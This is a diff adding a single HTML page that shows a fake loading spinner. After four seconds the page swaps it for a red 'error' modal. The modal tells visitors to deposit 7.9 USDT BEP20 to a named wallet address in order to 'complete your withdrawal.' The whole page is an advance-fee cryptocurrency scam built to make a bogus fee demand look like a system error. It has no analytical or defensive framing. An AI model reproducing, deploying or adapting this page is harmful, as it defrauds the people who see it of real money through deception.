@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        .loading-container {
+            text-align: center;
+            z-index: 1;
+        }
+
+        .loading-text {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .spinner {
+            border: 16px solid #f3f3f3; /* Light grey */
+            border-top: 16px solid #ffcc00; /* Yellow */
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .error-modal {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 0, 0, 0.9); /* Red background with transparency */
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+            z-index: 2; /* Ensure it's above other content */
+        }
+
+        .error-message {
+            font-size: 10px;
+            margin-top: 20px;
+        }
+        .error-message em {
+            color: yellow;
+        }
+  .error-message h4 {
+    color: yellow;
+    padding-left: 0px;
+    padding-right: 5px;
+    max-width: 100%; /* Ensure it doesn't exceed the parent container width */
+    overflow: visible; /* Ensure overflow content is visible */
+    text-overflow: clip; /* Do not add ellipses for overflow text */
+    white-space: normal; /* Allow text to wrap */
+}
+
+
+
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="loading-text">Loading...</div>
+        <div class="spinner"></div>
+    </div>
+
+    <div class="error-modal" id="error-modal">
+        <div class="error-message">
+            Error: Send only 7.9 USDT BEP20 to this deposit address. Sending any other coin or token to this address may result in loss of your deposit.
+            <br><br>
+        </div>
+        <div class="error-message"><h3>USDT BEP20:<em> 0x9674D901D17FADe925b5eeE82734EFd82045cdB5</em></h3>
+        
+        <p>Deposit To The Above BEP20 USDT WALLET ADDRESS and come back and complete your withdrawal...</p></div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // Show the error modal after 4 seconds
+            setTimeout(() => {
+                document.querySelector('.loading-container').style.display = 'none';
+                document.getElementById('error-modal').style.display = 'block';
+            }, 4000);
+        });
+    </script>
+</body>
+</html>
